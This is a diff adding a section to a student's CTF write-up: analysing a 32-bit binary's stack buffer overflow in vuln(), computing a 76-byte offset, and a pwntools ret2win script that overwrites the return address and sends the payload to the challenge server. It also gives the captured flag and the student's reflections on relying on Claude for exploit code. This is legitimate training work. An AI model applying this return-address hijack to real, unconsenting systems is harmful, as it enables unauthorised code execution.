@@ -161,3 +161,82 @@ A dummy 32-bit Linux binary was provided locally, with the real challenge runnin
 ---
 
 ### Approach & Analysis
+
+1. Checked the binary's protections and disassembled it (Ghidra/objdump) to find the vulnerable function.
+
+<img width="1307" height="287" alt="Image 10" src="https://github.com/user-attachments/assets/a1efd456-ac28-445f-ad20-698848579e3c" />
+
+2. Found `vuln()`: it reads up to 200 bytes (`read(0, buf, 0xc8)`) into a 68-byte stack buffer — no bounds checking, classic stack buffer overflow. Also found a `win()` function that's never called during normal execution but is clearly meant to print the flag.
+
+<img width="2226" height="1360" alt="image" src="https://github.com/user-attachments/assets/f99e0f4e-c34b-472c-b4da-ec1bc7141179" />
+<img width="2397" height="1393" alt="image" src="https://github.com/user-attachments/assets/c1dc4916-560c-4c16-8048-921519e1beb0" />
+
+3. Worked out the stack layout: 68 bytes of buffer + 4 bytes saved `ebx` + 4 bytes saved `ebp` = **76 bytes** before hitting the saved return address. Since there's no PIE/ASLR to defeat, `win()` sits at a fixed, known address.
+
+4. I'm not strong at scripting yet, so I used Claude to help write the exploit in Python (pwntools), the logic (pad to the return address, overwrite it with `win()`'s address) is something I understood and directed; I'm just not confident enough yet to have written the pwntools boilerplate from scratch myself.
+
+```python
+from pwn import *
+
+context.arch = 'i386'
+elf = context.binary = ELF('./chall', checksec=False)
+win_addr = elf.symbols['win']
+
+OFFSET = 76
+payload = b"A" * OFFSET + p32(win_addr)
+
+io = remote('cybersub.bytesoc.dev', 9999)
+io.sendline(payload)
+print(io.recvall(timeout=3).decode())
+```
+
+5. Tested locally against the dummy binary first to confirm the offset was right (`win()` triggered, printed the placeholder `FLAG_NOT_SET`), then ran it against the real remote service.
+
+<img width="1279" height="379" alt="image" src="https://github.com/user-attachments/assets/b97a37ce-e61d-40f3-be0c-7ec2bca519d9" />
+
+---
+
+### Result
+
+**Flag:**
+`BYTE{Buff3r_OverFl0w_k3_N45he}`
+
+---
+
+### Reflection
+
+This was my first time going from "read the disassembly" to "write and run a working remote exploit" rather than following a guided walkthrough. The concept (overflow a buffer to control the return address) made sense quickly from a DFIR angle — I already think about memory/stack layout from a forensics lens — but translating that understanding into working exploit code is a gap I want to close by actually learning pwntools properly rather than leaning on AI for it next time.
+
+---
+
+## Overall Takeaways
+
+- Known-plaintext / crib-based thinking is a genuinely useful crypto technique, not just a "cheat"
+- File-format-level forensics (chunk structure, headers, checksums) transfers surprisingly well into stego
+- I can read and reason about a binary vulnerability competently; I need to build independent scripting fluency so I'm not relying on AI assistance for exploit code
+- "Corrupted" doesn't always mean complex — two of three tasks here came down to a file lying about its own structure
+
+---
+
+## Tools & Platforms Used
+
+- CyberChef (Base64 decoding, Vigenère decode)
+- Hex editor (HxD) / `pngcheck`
+- Python (short patch/CRC scripts for Task 2; pwntools for Task 3)
+- Ghidra / objdump (disassembly for Task 3)
+- Netcat / pwntools `remote()` for the live service
+- Claude, specifically for help writing the Task 3 exploit script and as a guide for stego tooling/workflow, since I have limited prior experience in both areas
+
+---
+
+## What I'll Improve Before the Next CTF
+
+- Build real pwntools/scripting fluency instead of leaning on AI for exploit code
+- Get more deliberate practice with classical/layered ciphers so crypto stops being my weak point
+- Keep leaning into file-format-level forensics — it's clearly a strength
+
+---
+
+## Closing Note
+
+Three very different domains, three very different ways of getting stuck — and in each case, the unlock was questioning an assumption the challenge wanted me to make (that the cipher had to be guessed blind, that the image was broken rather than lying, that exploitation required more scripting skill than I currently have rather than just understanding the primitive). Write-ups like this are part of how I track that.
